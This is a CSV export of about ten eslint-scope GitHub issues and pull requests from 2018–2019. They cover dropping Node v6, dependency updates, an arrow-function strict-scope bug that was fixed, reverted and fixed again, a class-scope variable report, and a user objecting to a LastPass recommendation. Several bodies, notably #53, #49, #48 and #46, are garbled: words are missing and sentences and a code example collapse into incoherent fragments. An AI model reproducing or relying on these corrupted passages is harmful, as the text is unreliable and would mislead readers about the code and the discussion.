ID,State,Time Created,Time Updated,Time Closed,Username,User ID,Author Association,Title,Body
54,closed,2019-06-27T16:12:01Z,2019-07-19T16:46:51Z,2019-07-19T16:46:48Z,kaicataldo,7041728,MEMBER,Breaking: drop support for Node v6,refs https://github.com/eslint/eslint-scope/pull/53<\r><\n><\r><\n>Now that we've dropped support for Node <8<c> I think we should also drop support here. I'd like to merge this<c> merge https://github.com/eslint/eslint-scope/pull/53<c> and then cut a major release.<\r><\n><\r><\n>~~__Edit:__ @ilyavolodin made me aware that Webpack depends on `eslint-scope` directly<c> and it appears that they still support Node@6. Maybe this isn't something we want to do yet?~~<\r><\n><\r><\n>This was [discussed by the TSC](https://github.com/eslint/eslint-scope/pull/54#issuecomment-513060862)<c> who resolved to accept this.<\n>
53,closed,2019-06-26T16:58:41Z,2019-07-20T15:07:12Z,2019-07-20T15:07:07Z,kaicataldo,7041728,MEMBER,Upgrade: update dependencies after dropping support for Node <8,This PR updates some outdated dependencies. I have also run the autofixer and will comment on places I manually changed things.<\r><\n><\r><\n>I haven't worked in this repository of the (though I think what I have sense?).<\r><\n><\r><\n>~CI is failing in Node support in ESLint we also drop support and do a major release of PR be in on this and we to support for Node just drop support for Node 4)? We won't be able to upgrade to the latest version of ESLint in our devDependencies<c> though.~<\r><\n><\r><\n>~I've downgraded ESLint to v5 and it now passes CI in Node this in Node At this point<c> I guess we should just wait until we drop Node <8.~<\r><\n><\r><\n>__Edit 3:__ The TSC resolved to drop Node <8 for this package. See https://github.com/eslint/eslint-scope/pull/54.<\n>
52,closed,2019-03-02T09:57:19Z,2019-03-15T04:17:21Z,2019-03-15T04:17:16Z,futpib,4330357,CONTRIBUTOR,Fix: arrow function scope strictness (take 2),Fixes #49 <\r><\n><\r><\n>This has the original (broken) commit from #50 cherry-picked<c> and a separate a4ee79e commit fixing the `.length` error from #51.<\r><\n><\r><\n>I found linking (`npm link`) `eslint-scope` into `eslint` and running eslint's unit tests helpful<c> maybe this could be part of the `eslint-scope`'s CI checks?<\n>
51,closed,2019-03-02T01:27:14Z,2019-03-02T01:31:14Z,2019-03-02T01:31:12Z,not-an-aardvark,11638619,MEMBER,Revert "Fix: Arrow function scope strictness (fixes #49) (#50)",This reverts commit 2533966faf317df5a3847fab937ba462c16808b8.<\r><\n><\r><\n>The change is causing ESLint to crash with a parsing error on the following code:<\r><\n><\r><\n>```js<\r><\n>console.log(this); z(x => console.log(x<c> this))<\r><\n>```<\r><\n><\r><\n>```<\r><\n>TypeError: Cannot read property 'length' of undefined<\r><\n> at isStrictScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:93:40)<\r><\n> at new Scope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:254:25)<\r><\n> at new FunctionScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:641:9)<\r><\n> at ScopeManager.__nestFunctionScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope-manager.js:209:33)<\r><\n> at Referencer.visitFunction (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:200:27)<\r><\n> at Referencer.ArrowFunctionExpression (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:567:14)<\r><\n> at Referencer.Visitor.visit (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:104:34)<\r><\n> at Referencer.Visitor.visitChildren (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:83:38)<\r><\n> at Referencer.CallExpression (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:494:14)<\r><\n> at Referencer.Visitor.visit (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:104:34)<\r><\n>```<\r><\n><\r><\n>Since this is currently affecting ESLint users<c> we're reverting the change for now until we figure out the root cause.<\n>
50,closed,2019-02-19T16:41:24Z,2019-03-02T01:33:39Z,2019-02-22T00:02:06Z,futpib,4330357,CONTRIBUTOR,Fix arrow function scope strictness,Fixes #49 <\n>
49,closed,2019-02-16T20:53:45Z,2019-03-15T04:17:16Z,2019-03-15T04:17:16Z,futpib,4330357,CONTRIBUTOR,ArrowFunctionExpression's scope is always strict scope,seems to that `eslint-scope` to arrow is not it in the get my hands to.<\r><\n><\r><\n>I used assignment to an undeclared variable to check if the code is in strict mode:<\r><\n><\r><\n>With explicit strict mode<c> we get an error:<\r><\n>```bash<\r><\n>node -e '"use strict"; (() => { a = 5 })()'<\r><\n># ReferenceError: a is not defined<\r><\n>```<\r><\n><\r><\n>Without an is not means it's not in strict mode<c> but `eslint-scope` would treat the scope as strict anyway:<\r><\n>```bash<\r><\n>node -e => { = the strict code<c> and it seems that arrow functions should not get
48,closed,2019-02-16T15:00:55Z,2019-03-30T17:26:15Z,2019-02-16T19:53:16Z,futpib,4330357,CONTRIBUTOR,Class variable is found both in the module/global scope and the class scope,the X {<\r><\n> constructor() {<\r><\n> console.log(X);<\r><\n> }<\r><\n>};<\r><\n>console.log(X);<\r><\n>```<\r><\n><\r><\n>Or open https://astexplorer.net/#/gist/3a7a2b28e6098bc30ee7d16a4dabdbfc/3b9b700d7c8c40f4d9b1481ef940f532e1618b7c open the logged there).<\r><\n><\r><\n>For this code<c> the `X` variable is found (in the `scope.set.has('X')` sense) in two scopes: The the scope with one reference `console.log(X)` call)<\r><\n>2. The `class` scope with one reference `console.log(X)` in the the `X` variable is found in the scope two `console.log(X)` is with
47,closed,2018-11-07T19:23:26Z,2018-11-08T05:26:12Z,2018-11-08T05:26:09Z,kaicataldo,7041728,MEMBER,Chore: add supported Node.js versions to CI,Wanted to add Node v11 to the list of versions in CI and noticed a few others were missing. Do we want to drop support for Node@<6 at some point?<\n>
46,closed,2018-10-17T22:17:12Z,2018-10-18T01:09:10Z,2018-10-18T01:09:07Z,not-an-aardvark,11638619,MEMBER,Upgrade: eslint-release@1.0.0,to the package to still the Jenkins server now that we have 2FA enabled on the bot account.<\r><\n><\r><\n>Some changes on the Jenkins server -- I plan to make those changes after
44,closed,2018-07-14T14:31:04Z,2018-07-17T06:48:55Z,2018-07-16T16:23:05Z,ghost,10137,NONE,Please don't recommend LastPass,From your post-mortem #39:<\r><\n><\r><\n>> Package maintainers and users should avoid reusing the same password across multiple different sites. A password manager like 1Password or LastPass can help with this.<\r><\n><\r><\n>Please reconsider recommendations of this nature as these are paid services and LastPass has a history of getting hacked.<\r><\n><\r><\n>Instead<c> consider using a sneakernet password manager like [KeePassX](https://keepassx.org/) instead or<c> if you like your password managers online and open source<c> use [BitWarden](https://bitwarden.com/)—recently removed from the [list of password managers wiki](https://en.wikipedia.org/wiki/List_of_password_managers) for reasons which I don't care to look into.<\r><\n><\r><\n>Thanks.<\n>
